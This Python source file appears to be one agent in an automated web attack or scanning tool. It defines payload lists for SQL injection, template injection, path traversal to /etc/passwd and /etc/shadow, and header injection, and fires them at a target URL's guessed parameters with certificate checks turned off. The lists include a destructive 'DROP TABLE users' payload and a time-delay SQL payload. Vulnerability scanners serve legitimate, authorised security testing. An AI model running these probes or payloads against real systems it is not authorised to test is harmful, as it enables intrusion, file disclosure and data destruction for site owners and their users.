from __future__ import annotations
import asyncio
import logging
from typing import Any
from urllib.parse import urlparse

import httpx

from core.agents.base import BaseAgent

logger = logging.getLogger(__name__)

SQLI_PAYLOADS = [
    "'", "\"", "',", "\",", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR 1=1--", "\" OR 1=1--", "1' OR '1'='1'--",
    "1\" OR \"1\"=\"1\"--", "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--", "') UNION SELECT 1,2,3--",
    "'; SELECT * FROM users--", "'; DROP TABLE users--",
    "admin'--", "admin' OR '1'='1", "1; SELECT pg_sleep(5)--",
]

SQLI_ERROR_SIGS = [
    "sql syntax", "mysql_fetch", "ora-", "oracle", "sqlite",
    "postgresql", "pg_", "unclosed quotation", "odbc",
    "sqlserver", "microsoft ole db", "db2", "sql error",
    "syntax error", "warning: mysql", "you have an error in your sql",
    "division by zero", "unexpected", "mysql_num_rows",
    "mysql_fetch_array", "getSQL", "sqlcommand",
]

SSTI_PAYLOADS = [
    ("jinja2/django", "{{7*7}}"),
    ("jinja2_alt", "{{7*'7'}}"),
    ("twig", "{{7*7}}"),
    ("freemarker", "${7*7}"),
    ("velocity", "#set($x=7*7)$x"),
    ("smarty", "{$smarty.now}"),
    ("java", "${7*7}"),
    ("erb", "<%= 7*7 %>"),
    ("python", "{7*7}"),
    ("handlebars", "{{7*7}}"),
]

SSTI_SUCCESS_SIGS = ["49", "77", "7777777", "7*7"]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
]

TRAVERSAL_SUCCESS_SIGS = [
    "root:", "root:x:", "[extensions]", "[fonts]",
    "bin/bash", "nobody:", "daemon:",
    "for 16-bit app support",
]

HEADER_INJECTION_PAYLOADS = [
    "X-Injected: true",
    "X-Custom: injected\r\nX-Test: true",
]


class PayloadAgent(BaseAgent):
    name = "PAYLOAD"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)

    async def run(self, context: dict) -> dict:
        target_url = context.get("target_url", "")
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        planner_data = context.get("planner", {})
        guess_params = ["q", "s", "search", "id", "page", "file", "path", "name", "cat", "category", "url", "view", "doc", "action", "dir", "include", "page_id", "article_id"]

        result: dict[str, Any] = {
            "base_url": base,
            "sqli_findings": [],
            "ssti_findings": [],
            "path_traversal_findings": [],
            "header_injection_findings": [],
            "findings": [],
        }

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0),
            follow_redirects=False,
            verify=False,
        ) as client:

            self.emit_running("Testing SQL injection signatures...")
            sqli = await self._test_sqli(client, base, guess_params)
            result["sqli_findings"] = sqli
            for s in sqli:
                self.emit_running(f"SQLi reflection: {s['detail'][:80]}")
                result.setdefault("findings", []).append(s)

            self.emit_running("Testing SSTI (Server-Side Template Injection)...")
            ssti = await self._test_ssti(client, base, guess_params)
            result["ssti_findings"] = ssti
            for s in ssti:
                self.emit_running(f"SSTI vector: {s['detail'][:80]}")
                result.setdefault("findings", []).append(s)

            self.emit_running("Testing path traversal...")
            traversal = await self._test_path_traversal(client, base, guess_params)
            result["path_traversal_findings"] = traversal
            for t in traversal:
                self.emit_running(f"Path traversal: {t['detail'][:80]}")
                result.setdefault("findings", []).append(t)

            self.emit_running("Testing HTTP header injection...")
            hdr_inj = await self._test_header_injection(client, base)
            result["header_injection_findings"] = hdr_inj
            for h in hdr_inj:
                self.emit_running(f"Header injection: {h['detail'][:80]}")
                result.setdefault("findings", []).append(h)

        self.emit_complete(f"Payload complete: {len(result.get('findings',[]))} findings")
        return result

    async def _test_sqli(self, client: httpx.AsyncClient, base: str, params: list[str]) -> list[dict]:
        findings = []
        for param in params[:5]:
            for payload in SQLI_PAYLOADS[:8]:
                try:
                    url = f"{base}?{param}={payload}"
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        body = resp.text.lower()
                        for sig in SQLI_ERROR_SIGS:
                            if sig in body:
                                findings.append({
                                    "type": "sql_injection",
                                    "param": param,
                                    "payload": payload,
                                    "evidence": f"Error signature '{sig}' found in response",
                                    "detail": f"SQLi reflection on {param} with payload {payload[:50]}",
                                })
                                return findings
                except Exception:
                    pass
        return findings

    async def _test_ssti(self, client: httpx.AsyncClient, base: str, params: list[str]) -> list[dict]:
        findings = []
        for param in params[:5]:
            for engine, payload in SSTI_PAYLOADS:
                try:
                    url = f"{base}?{param}={payload}"
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        body = resp.text
                        for sig in SSTI_SUCCESS_SIGS:
                            if sig in body and len(body) < 5000:
                                findings.append({
                                    "type": "ssti",
                                    "param": param,
                                    "payload": payload,
                                    "engine": engine,
                                    "evidence": f"'{sig}' reflected in response",
                                    "detail": f"Potential SSTI ({engine}) via {param} with {payload[:40]}",
                                })
                                break
                except Exception:
                    pass
        return findings

    async def _test_path_traversal(self, client: httpx.AsyncClient, base: str, params: list[str]) -> list[dict]:
        findings = []
        for param in params[:5]:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                try:
                    url = f"{base}?{param}={payload}"
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        body = resp.text.lower()
                        for sig in TRAVERSAL_SUCCESS_SIGS:
                            if sig in body:
                                findings.append({
                                    "type": "path_traversal",
                                    "param": param,
                                    "payload": payload[:50],
                                    "evidence": f"Signature '{sig}' found in response",
                                    "detail": f"Path traversal via {param}",
                                })
                                break
                except Exception:
                    pass
        return findings

    async def _test_header_injection(self, client: httpx.AsyncClient, base: str) -> list[dict]:
        findings = []
        for payload in HEADER_INJECTION_PAYLOADS:
            try:
                resp = await client.get(base, headers={"X-Custom": payload})
                for k, v in resp.headers.items():
                    if "injected" in v.lower() or "true" == v.lower():
                        findings.append({
                            "type": "header_injection",
                            "payload": payload[:50],
                            "evidence": f"Header '{k}: {v}' reflected injection",
                            "detail": f"Potential header injection with {payload[:40]}",
                        })
                        break
            except Exception:
                pass
        return findings
